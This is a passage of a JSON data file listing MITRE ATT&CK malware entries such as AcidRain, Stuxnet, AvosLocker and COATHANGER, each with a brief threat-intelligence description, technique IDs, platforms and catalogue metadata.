      "description": "[AcidRain](https://attack.mitre.org/software/S1125) is an ELF binary targeting modems and routers using MIPS architecture.(Citation: AcidRain JAGS 2022) [AcidRain](https://attack.mitre.org/software/S1125) is associated with the ViaSat KA-SAT communication outage that took place during the initial phases of the 2022 full-scale invasion of Ukraine. Analysis indicates overlap with another network device-targeting malware, VPNFilter, associated with [Sandworm Team](https://attack.mitre.org/groups/G0034).(Citation: AcidRain JAGS 2022) US and European government sources linked [AcidRain](https://attack.mitre.org/software/S1125) to Russian government entities, while Ukrainian government sources linked [AcidRain](https://attack.mitre.org/software/S1125) specifically to [Sandworm Team](https://attack.mitre.org/groups/G0034).(Citation: AcidRain State Department 2022)(Citation: Vincens AcidPour 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1529",
        "T1485",
        "T1561.001",
        "T1083"
      ],
      "platforms": [
        "Network Devices",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1125",
      "stix_id": "malware--04cecafd-cb5f-4daf-aa1f-73899116c4a2",
      "created": "2024-03-25T15:27:08.214000+00:00",
      "modified": "2025-04-15T19:46:33.099000+00:00"
    },
    "S0417": {
      "id": "S0417",
      "name": "GRIFFON",
      "description": "[GRIFFON](https://attack.mitre.org/software/S0417) is a JavaScript backdoor used by [FIN7](https://attack.mitre.org/groups/G0046). (Citation: SecureList Griffon May 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1113",
        "T1069.002",
        "T1124",
        "T1059.007",
        "T1082",
        "T1547.001",
        "T1053.005",
        "T1059.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0417",
      "stix_id": "malware--04fc1842-f9e4-47cf-8cb8-5c61becad142",
      "created": "2019-10-11T17:29:20.165000+00:00",
      "modified": "2025-04-25T14:42:33.402000+00:00"
    },
    "S0343": {
      "id": "S0343",
      "name": "Exaramel for Windows",
      "description": "[Exaramel for Windows](https://attack.mitre.org/software/S0343) is a backdoor used for targeting Windows systems. The Linux version is tracked separately under [Exaramel for Linux](https://attack.mitre.org/software/S0401).(Citation: ESET TeleBots Oct 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1560",
        "T1059.005",
        "T1027.011",
        "T1543.003",
        "T1112",
        "T1059.003",
        "T1036.004",
        "T1074.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0343",
      "stix_id": "malware--051eaca1-958f-4091-9e5f-a9acd8f820b5",
      "created": "2019-01-30T15:10:03.894000+00:00",
      "modified": "2025-04-16T20:37:52.840000+00:00"
    },
    "S1025": {
      "id": "S1025",
      "name": "Amadey",
      "description": "[Amadey](https://attack.mitre.org/software/S1025) is a Trojan bot that has been used since at least October 2018.(Citation: Korean FSI TA505 2020)(Citation: BlackBerry Amadey 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1027",
        "T1568.001",
        "T1518.001",
        "T1106",
        "T1005",
        "T1041",
        "T1553.005",
        "T1105",
        "T1082",
        "T1112",
        "T1547.001",
        "T1140",
        "T1033",
        "T1614",
        "T1071.001",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1025",
      "stix_id": "malware--05318127-5962-444b-b900-a9dcfe0ff6e9",
      "created": "2022-07-14T17:30:54.927000+00:00",
      "modified": "2024-05-07T19:11:33.669000+00:00"
    },
    "S1206": {
      "id": "S1206",
      "name": "JumbledPath",
      "description": "[JumbledPath](https://attack.mitre.org/software/S1206) is a custom-built utility written in GO that has been used by [Salt Typhoon](https://attack.mitre.org/groups/G1045) since at least 2024 for packet capture on remote Cisco devices. [JumbledPath](https://attack.mitre.org/software/S1206) is compiled as an ELF binary using x86-64 architecture which makes it potentially useable across Linux operating systems and network devices from multiple vendors.(Citation: Cisco Salt Typhoon FEB 2025)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.002",
        "T1040",
        "T1104",
        "T1665",
        "T1560",
        "T1562"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1206",
      "stix_id": "malware--05489800-6c6f-4922-a0de-d573b333e612",
      "created": "2025-02-25T20:50:43.343000+00:00",
      "modified": "2025-04-15T19:46:33.196000+00:00"
    },
    "S0416": {
      "id": "S0416",
      "name": "RDFSNIFFER",
      "description": "[RDFSNIFFER](https://attack.mitre.org/software/S0416) is a module loaded by [BOOSTWRITE](https://attack.mitre.org/software/S0415) which allows an attacker to monitor and tamper with legitimate connections made via an application designed to provide visibility and system management capabilities to remote IT techs.(Citation: FireEye FIN7 Oct 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.004",
        "T1070.004",
        "T1106"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0416",
      "stix_id": "malware--065196de-d7e8-4888-acfb-b2134022ba1b",
      "created": "2019-10-11T16:13:19.588000+00:00",
      "modified": "2025-04-25T14:42:34.305000+00:00"
    },
    "S1192": {
      "id": "S1192",
      "name": "NICECURL",
      "description": "[NICECURL](https://attack.mitre.org/software/S1192) is a VBScript-based backdoor used by [APT42](https://attack.mitre.org/groups/G1044) to download additional modules.(Citation: Mandiant APT42-untangling)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1059",
        "T1573.002",
        "T1105",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1192",
      "stix_id": "malware--0659f55c-3b68-4e5d-8071-12ded6684731",
      "created": "2025-01-08T22:16:27.705000+00:00",
      "modified": "2025-01-08T23:14:18.123000+00:00"
    },
    "S0238": {
      "id": "S0238",
      "name": "Proxysvc",
      "description": "[Proxysvc](https://attack.mitre.org/software/S0238) is a malicious DLL used by [Lazarus Group](https://attack.mitre.org/groups/G0032) in a campaign known as Operation GhostSecret. It has appeared to be operating undetected since 2017 and was mostly observed in higher education organizations. The goal of [Proxysvc](https://attack.mitre.org/software/S0238) is to deliver additional payloads to the target and to maintain control for the attacker. It is in the form of a DLL that can also be executed as a standalone process. (Citation: McAfee GhostSecret)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1071.001",
        "T1070.004",
        "T1119",
        "T1569.002",
        "T1083",
        "T1082",
        "T1057",
        "T1041",
        "T1012",
        "T1016",
        "T1124",
        "T1059.003",
        "T1485"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0238",
      "stix_id": "malware--069af411-9b24-4e85-b26c-623d035bbe84",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:42:34.849000+00:00"
    },
    "S0229": {
      "id": "S0229",
      "name": "Orz",
      "description": "[Orz](https://attack.mitre.org/software/S0229) is a custom JavaScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). It was observed being used in 2014 as well as in August 2017 when it was dropped by Microsoft Publisher files. (Citation: Proofpoint Leviathan Oct 2017) (Citation: FireEye Periscope March 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1059.003",
        "T1218.010",
        "T1102.002",
        "T1057",
        "T1082",
        "T1070",
        "T1518",
        "T1105",
        "T1112",
        "T1016",
        "T1055.012",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0229",
      "stix_id": "malware--06d735e7-1db1-4dbe-ab4b-acbe419f902b",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:37:53.293000+00:00"
    },
    "S0678": {
      "id": "S0678",
      "name": "Torisma",
      "description": "[Torisma](https://attack.mitre.org/software/S0678) is a second stage implant designed for specialized monitoring that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032). [Torisma](https://attack.mitre.org/software/S0678) was discovered during an investigation into the 2020 Operation North Star campaign that targeted the defense sector.(Citation: McAfee Lazarus Nov 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1106",
        "T1082",
        "T1124",
        "T1041",
        "T1132.001",
        "T1480",
        "T1049",
        "T1140",
        "T1027.002",
        "T1573.001",
        "T1071.001",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0678",
      "stix_id": "malware--0715560d-4299-4e84-9e20-6e80ab57e4f2",
      "created": "2022-02-01T16:21:13.097000+00:00",
      "modified": "2024-04-10T22:31:28.094000+00:00"
    },
    "S0353": {
      "id": "S0353",
      "name": "NOKKI",
      "description": "[NOKKI](https://attack.mitre.org/software/S0353) is a modular remote access tool. The earliest observed attack using [NOKKI](https://attack.mitre.org/software/S0353) was in January 2018. [NOKKI](https://attack.mitre.org/software/S0353) has significant code overlap with the [KONNI](https://attack.mitre.org/software/S0356) malware family. There is some evidence potentially linking [NOKKI](https://attack.mitre.org/software/S0353) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1124",
        "T1547.001",
        "T1105",
        "T1036.005",
        "T1027",
        "T1070.004",
        "T1033",
        "T1218.011",
        "T1140",
        "T1071.001",
        "T1074.001",
        "T1016",
        "T1056.004",
        "T1071.002",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0353",
      "stix_id": "malware--071d5d65-83ec-4a55-acfa-be7d5f28ba9a",
      "created": "2019-01-30T19:50:45.307000+00:00",
      "modified": "2025-04-25T14:42:35.581000+00:00"
    },
    "S0248": {
      "id": "S0248",
      "name": "yty",
      "description": "[yty](https://attack.mitre.org/software/S0248) is a modular, plugin-based malware framework. The components of the framework are written in a variety of programming languages. (Citation: ASERT Donot March 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1053.005",
        "T1102.002",
        "T1027.016",
        "T1018",
        "T1005",
        "T1497.001",
        "T1057",
        "T1033",
        "T1082",
        "T1056.001",
        "T1113",
        "T1027.002",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0248",
      "stix_id": "malware--0817aaf2-afea-4c32-9285-4dcd1df5bf14",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:42:35.950000+00:00"
    },
    "S0093": {
      "id": "S0093",
      "name": "Backdoor.Oldrea",
      "description": "[Backdoor.Oldrea](https://attack.mitre.org/software/S0093) is a modular backdoor that used by [Dragonfly](https://attack.mitre.org/groups/G0035) against energy companies since at least 2013. [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) was distributed via supply chain compromise, and included specialized modules to enumerate and map ICS-specific systems, processes, and protocols.(Citation: Symantec Dragonfly)(Citation: Gigamon Berserk Bear October 2021)(Citation: Symantec Dragonfly Sept 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1046",
        "T1070.004",
        "T1016",
        "T1218.011",
        "T1055",
        "T1132.001",
        "T1105",
        "T1087.003",
        "T1560",
        "T1555.003",
        "T1057",
        "T1083",
        "T1033",
        "T1018",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0093",
      "stix_id": "malware--083bb47b-02c8-4423-81a2-f9ef58572974",
      "created": "2017-05-31T21:32:59.661000+00:00",
      "modified": "2025-04-16T20:37:53.808000+00:00"
    },
    "S0213": {
      "id": "S0213",
      "name": "DOGCALL",
      "description": "[DOGCALL](https://attack.mitre.org/software/S0213) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) that has been used to target South Korean government and military organizations in 2017. It is typically dropped using a Hangul Word Processor (HWP) exploit. (Citation: FireEye APT37 Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1113",
        "T1105",
        "T1027.013",
        "T1102.002",
        "T1123"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0213",
      "stix_id": "malware--0852567d-7958-4f4b-8947-4f840ec8d57d",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T15:01:33.385000+00:00"
    },
    "S0603": {
      "id": "S0603",
      "name": "Stuxnet",
      "description": "[Stuxnet](https://attack.mitre.org/software/S0603) was the first publicly reported piece of malware to specifically target industrial control systems devices. [Stuxnet](https://attack.mitre.org/software/S0603) is a large and complex piece of malware that utilized multiple different behaviors including multiple zero-day vulnerabilities, a sophisticated Windows rootkit, and network infection routines.(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)(Citation: CISA ICS Advisory ICSA-10-272-01)(Citation: ESET Stuxnet Under the Microscope)(Citation: Langer Stuxnet) [Stuxnet](https://attack.mitre.org/software/S0603) was discovered in 2010, with some components being used as early as November 2008.(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1082",
        "T1132.001",
        "T1560.003",
        "T1070.006",
        "T1129",
        "T1047",
        "T1112",
        "T1543.003",
        "T1140",
        "T1070.004",
        "T1134.001",
        "T1210",
        "T1027.013",
        "T1091",
        "T1480",
        "T1041",
        "T1070",
        "T1055.001",
        "T1573.001",
        "T1014",
        "T1071.001",
        "T1083",
        "T1008",
        "T1087.002",
        "T1120",
        "T1068",
        "T1078.001",
        "T1518.001",
        "T1087.001",
        "T1562",
        "T1021.002",
        "T1012",
        "T1124",
        "T1553.002",
        "T1135",
        "T1078.002",
        "T1106",
        "T1570",
        "T1053.005",
        "T1021",
        "T1090.001",
        "T1080",
        "T1505.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0603",
      "stix_id": "malware--088f1d6e-0783-47c6-9923-9c79b2af43d4",
      "created": "2020-12-14T17:34:58.457000+00:00",
      "modified": "2025-01-02T19:40:26.678000+00:00"
    },
    "S0134": {
      "id": "S0134",
      "name": "Downdelph",
      "description": "[Downdelph](https://attack.mitre.org/software/S0134) is a first-stage downloader written in Delphi that has been used by [APT28](https://attack.mitre.org/groups/G0007) in rare instances between 2013 and 2015. (Citation: ESET Sednit Part 3)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1001.001",
        "T1548.002",
        "T1573.001",
        "T1105",
        "T1574.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0134",
      "stix_id": "malware--08d20cd2-f084-45ee-8558-fa6ef5a18519",
      "created": "2017-05-31T21:33:16.790000+00:00",
      "modified": "2025-04-25T14:42:36.848000+00:00"
    },
    "S1078": {
      "id": "S1078",
      "name": "RotaJakiro",
      "description": "[RotaJakiro](https://attack.mitre.org/software/S1078) is a 64-bit Linux backdoor used by [APT32](https://attack.mitre.org/groups/G0050). First seen in 2018, it uses a plugin architecture to extend capabilities. [RotaJakiro](https://attack.mitre.org/software/S1078) can determine it's permission level and execute according to access type (`root` or `user`).(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: netlab360 rotajakiro vs oceanlotus)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1546.004",
        "T1106",
        "T1132.001",
        "T1037",
        "T1082",
        "T1543.002",
        "T1129",
        "T1571",
        "T1095",
        "T1036.005",
        "T1559",
        "T1057",
        "T1119",
        "T1547.013",
        "T1041",
        "T1573.001"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1078",
      "stix_id": "malware--08e844a8-371f-4fe3-9d1f-e056e64a7fde",
      "created": "2023-06-14T17:04:01.673000+00:00",
      "modified": "2023-10-12T21:19:45.801000+00:00"
    },
    "S1053": {
      "id": "S1053",
      "name": "AvosLocker",
      "description": "[AvosLocker](https://attack.mitre.org/software/S1053) is ransomware written in C++ that has been offered via the Ransomware-as-a-Service (RaaS) model. It was first observed in June 2021 and has been used against financial services, critical manufacturing, government facilities, and other critical infrastructure sectors in the United States. As of March 2022, [AvosLocker](https://attack.mitre.org/software/S1053) had also been used against organizations in Belgium, Canada, China, Germany, Saudi Arabia, Spain, Syria, Taiwan, Turkey, the United Arab Emirates, and the United Kingdom.(Citation: Malwarebytes AvosLocker Jul 2021)(Citation: Trend Micro AvosLocker Apr 2022)(Citation: Joint CSA AvosLocker Mar 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1486",
        "T1547.001",
        "T1140",
        "T1027.007",
        "T1083",
        "T1036.008",
        "T1564.003",
        "T1489",
        "T1135",
        "T1562.009",
        "T1027",
        "T1124",
        "T1057",
        "T1529"
      ],
      "platforms": [
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1053",
      "stix_id": "malware--0945a1a5-a79a-47c8-9079-10c16cdfcb5d",
      "created": "2023-01-11T21:17:36.149000+00:00",
      "modified": "2025-04-21T19:40:47.538000+00:00"
    },
    "S0185": {
      "id": "S0185",
      "name": "SEASHARPEE",
      "description": "[SEASHARPEE](https://attack.mitre.org/software/S0185) is a Web shell that has been used by [OilRig](https://attack.mitre.org/groups/G0049). (Citation: FireEye APT34 Webinar Dec 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1070.006",
        "T1059.003",
        "T1505.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0185",
      "stix_id": "malware--0998045d-f96e-4284-95ce-3c8219707486",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:42:37.580000+00:00"
    },
    "S0460": {
      "id": "S0460",
      "name": "Get2",
      "description": "[Get2](https://attack.mitre.org/software/S0460) is a downloader written in C++ that has been used by [TA505](https://attack.mitre.org/groups/G0092) to deliver [FlawedGrace](https://attack.mitre.org/software/S0383), [FlawedAmmyy](https://attack.mitre.org/software/S0381), Snatch and [SDBbot](https://attack.mitre.org/software/S0461).(Citation: Proofpoint TA505 October 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055.001",
        "T1057",
        "T1082",
        "T1059",
        "T1033",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0460",
      "stix_id": "malware--099ecff2-41b8-436d-843c-038a9aa9aa69",
      "created": "2020-05-29T20:32:42.686000+00:00",
      "modified": "2025-04-25T14:42:37.942000+00:00"
    },
    "S0184": {
      "id": "S0184",
      "name": "POWRUNER",
      "description": "[POWRUNER](https://attack.mitre.org/software/S0184) is a PowerShell script that sends and receives commands to and from the C2 server. (Citation: FireEye APT34 Dec 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1071.001",
        "T1047",
        "T1057",
        "T1071.004",
        "T1033",
        "T1518.001",
        "T1069.002",
        "T1069.001",
        "T1087.002",
        "T1083",
        "T1082",
        "T1059.003",
        "T1059.001",
        "T1132.001",
        "T1105",
        "T1012",
        "T1049",
        "T1053.005",
        "T1113"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0184",
      "stix_id": "malware--09b2cd76-c674-47cc-9f57-d2f2ad150a46",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:42:38.309000+00:00"
    },
    "S1075": {
      "id": "S1075",
      "name": "KOPILUWAK",
      "description": "[KOPILUWAK](https://attack.mitre.org/software/S1075) is a JavaScript-based reconnaissance tool that has been used for victim profiling and C2 since at least 2017.(Citation: Mandiant Suspected Turla Campaign February 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1204.002",
        "T1057",
        "T1135",
        "T1016",
        "T1041",
        "T1082",
        "T1049",
        "T1566.001",
        "T1005",
        "T1074.001",
        "T1059.007",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1075",
      "stix_id": "malware--09fcc02f-f9d4-43fa-8609-5e5e186b7103",
      "created": "2023-05-17T18:49:25.528000+00:00",
      "modified": "2025-04-16T20:37:54.797000+00:00"
    },
    "S0400": {
      "id": "S0400",
      "name": "RobbinHood",
      "description": "[RobbinHood](https://attack.mitre.org/software/S0400) is ransomware that was first observed being used in an attack against the Baltimore city government's computer network.(Citation: CarbonBlack RobbinHood May 2019)(Citation: BaltimoreSun RobbinHood May 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1490",
        "T1489",
        "T1070.005",
        "T1562.001",
        "T1486",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0400",
      "stix_id": "malware--0a607c53-df52-45da-a75d-0e53df4dad5f",
      "created": "2019-07-29T14:27:18.204000+00:00",
      "modified": "2025-04-25T14:42:38.861000+00:00"
    },
    "S1154": {
      "id": "S1154",
      "name": "VersaMem",
      "description": "[VersaMem](https://attack.mitre.org/software/S1154) is a web shell designed for deployment to Versa Director servers following exploitation. Discovered in August 2024, [VersaMem](https://attack.mitre.org/software/S1154) was used during [Versa Director Zero Day Exploitation](https://attack.mitre.org/campaigns/C0039) by [Volt Typhoon](https://attack.mitre.org/groups/G1017) to target ISPs and MSPs.  [VersaMem](https://attack.mitre.org/software/S1154) is deployed as a Java Archive (JAR) and allows for credential capture for Versa Director logon activity as well as follow-on execution of arbitrary Java payloads.(Citation: Lumen Versa 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.004",
        "T1203",
        "T1027.013",
        "T1070.004",
        "T1059",
        "T1074.001",
        "T1040",
        "T1129"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1154",
      "stix_id": "malware--0a6ec267-83a9-41a5-98c7-57c3ff81e11f",
      "created": "2024-08-27T19:00:38.548000+00:00",
      "modified": "2025-04-15T19:46:33.283000+00:00"
    },
    "S0177": {
      "id": "S0177",
      "name": "Power Loader",
      "description": "[Power Loader](https://attack.mitre.org/software/S0177) is modular code sold in the cybercrime market used as a downloader in malware families such as Carberp, Redyms and Gapz. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055.011"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0177",
      "stix_id": "malware--0a9c51e0-825d-4b9b-969d-ce86ed8ce3c3",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:42:39.406000+00:00"
    },
    "S0164": {
      "id": "S0164",
      "name": "TDTESS",
      "description": "[TDTESS](https://attack.mitre.org/software/S0164) is a 64-bit .NET binary backdoor used by [CopyKittens](https://attack.mitre.org/groups/G0052). (Citation: ClearSky Wilted Tulip July 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1105",
        "T1059.003",
        "T1070.006",
        "T1543.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0164",
      "stix_id": "malware--0b32ec39-ba61-4864-9ebe-b4b0b73caf9a",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:42:39.777000+00:00"
    },
    "S1041": {
      "id": "S1041",
      "name": "Chinoxy",
      "description": "[Chinoxy](https://attack.mitre.org/software/S1041) is a backdoor that has been used since at least November 2018, during the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign, to gain persistence and drop additional payloads. According to security researchers, [Chinoxy](https://attack.mitre.org/software/S1041) has been used by Chinese-speaking threat actors.(Citation: Bitdefender FunnyDream Campaign November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1574.001",
        "T1140",
        "T1547.001",
        "T1027.013",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1041",
      "stix_id": "malware--0b639373-5f03-430e-b8f9-2fe8c8faad8e",
      "created": "2022-09-21T16:46:22.726000+00:00",
      "modified": "2024-04-11T02:46:10.914000+00:00"
    },
    "S0546": {
      "id": "S0546",
      "name": "SharpStage",
      "description": "[SharpStage](https://attack.mitre.org/software/S0546) is a .NET malware with backdoor capabilities.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1053.005",
        "T1547.001",
        "T1102",
        "T1113",
        "T1059.001",
        "T1105",
        "T1082",
        "T1140",
        "T1614.001",
        "T1047"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0546",
      "stix_id": "malware--0ba9281c-93fa-4b29-8e9e-7ef918c7b13a",
      "created": "2020-12-22T17:02:52.954000+00:00",
      "modified": "2025-04-25T14:42:40.376000+00:00"
    },
    "S1105": {
      "id": "S1105",
      "name": "COATHANGER",
      "description": "[COATHANGER](https://attack.mitre.org/software/S1105) is a remote access tool (RAT) targeting FortiGate networking appliances. First used in 2023 in targeted intrusions against military and government entities in the Netherlands along with other victims, [COATHANGER](https://attack.mitre.org/software/S1105) was disclosed in early 2024, with a high confidence assessment linking this malware to a state-sponsored entity in the People's Republic of China. [COATHANGER](https://attack.mitre.org/software/S1105) is delivered after gaining access to a FortiGate device, with in-the-wild observations linked to exploitation of CVE-2022-42475. The name [COATHANGER](https://attack.mitre.org/software/S1105) is based on a unique string in the malware used to encrypt configuration files on disk: <code>\u201cShe took his coat and hung it up\u201d</code>.(Citation: NCSC-NL COATHANGER Feb 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1095",
        "T1057",
        "T1543.004",
        "T1055",
        "T1059.004",
        "T1190",
        "T1222.002",
        "T1083",
        "T1014",
        "T1574.006",
        "T1027.002",
        "T1573.002",
        "T1574",
        "T1071.001",
        "T1140",
        "T1564.001",
        "T1027"
      ],
      "platforms": [
        "Linux",
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1105",
      "stix_id": "malware--0c242cc5-58d3-4fe3-a866-b00a4b6fb817",
      "created": "2024-02-07T18:33:18.551000+00:00",
      "modified": "2025-04-15T19:46:33.371000+00:00"
    },
    "S1085": {
      "id": "S1085",
      "name": "Sardonic",
      "description": "[Sardonic](https://attack.mitre.org/software/S1085) is a backdoor written in C and C++ that is known to be used by [FIN8](https://attack.mitre.org/groups/G0061), as early as August 2021 to target a financial institution in the United States. [Sardonic](https://attack.mitre.org/software/S1085) has a plugin system that can load specially made DLLs and execute their functions.(Citation: Bitdefender Sardonic Aug 2021)(Citation: Symantec FIN8 Jul 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1047",
        "T1027.010",
        "T1082",
        "T1016",
        "T1573.001",
        "T1546.003",
        "T1105",
        "T1135",
        "T1140",
        "T1005",
        "T1059.003",
        "T1571",
        "T1057",
        "T1007",
        "T1106",
        "T1132.001",
        "T1070",
        "T1620",
        "T1573.002",
        "T1027",
        "T1059.001",
        "T1049",
        "T1055.004",
        "T1095"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1085",
      "stix_id": "malware--0c52f5bc-557d-4083-bd27-66d7cdb794bb",
      "created": "2023-09-05T15:56:46.250000+00:00",
      "modified": "2023-10-04T15:36:06.160000+00:00"
    },
    "S0226": {
      "id": "S0226",
      "name": "Smoke Loader",
      "description": "[Smoke Loader](https://attack.mitre.org/software/S0226) is a malicious bot application that can be used to load other malware.\n[Smoke Loader](https://attack.mitre.org/software/S0226) has been seen in the wild since at least 2011 and has included a number of different payloads. It is notorious for its use of deception and self-protection. It also comes with several plug-ins. (Citation: Malwarebytes SmokeLoader 2016) (Citation: Microsoft Dofoil 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1552.001",
        "T1114.001",
        "T1059.005",
        "T1555.003",
        "T1071.001",
        "T1497.001",
        "T1105",
        "T1547.001",
        "T1055.012",
        "T1027.013",
        "T1055",
        "T1053.005",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0226",
      "stix_id": "malware--0c824410-58ff-49b2-9cf2-1c96b182bdf0",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-04-11T00:04:55.094000+00:00"
    },
    "S0151": {
      "id": "S0151",
      "name": "HALFBAKED",
      "description": "[HALFBAKED](https://attack.mitre.org/software/S0151) is a malware family consisting of multiple components intended to establish persistence in victim networks. (Citation: FireEye FIN7 April 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1047",
        "T1113",
        "T1059.001",
        "T1070.004",
        "T1082"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0151",
      "stix_id": "malware--0ced8926-914e-4c78-bc93-356fb90dbd1f",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-25T14:42:41.277000+00:00"
    },
    "S0466": {
      "id": "S0466",
      "name": "WindTail",
      "description": "[WindTail](https://attack.mitre.org/software/S0466) is a macOS surveillance implant used by [Windshift](https://attack.mitre.org/groups/G0112). [WindTail](https://attack.mitre.org/software/S0466) shares code similarities with Hack Back aka KitM OSX.(Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.001",
        "T1106",
        "T1083",
        "T1027.013",
        "T1071.001",
        "T1027.015",
        "T1059.004",
        "T1119",
        "T1036",
        "T1560.001",
        "T1140",
        "T1070.004",
        "T1048.003",
        "T1564.003",
        "T1124"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0466",
      "stix_id": "malware--0d1f9f5b-11ea-42c3-b5f4-63cce0122541",
      "created": "2020-06-04T19:01:53.566000+00:00",
      "modified": "2024-11-17T14:15:51.851000+00:00"
    },
    "S0083": {
      "id": "S0083",
      "name": "Misdat",
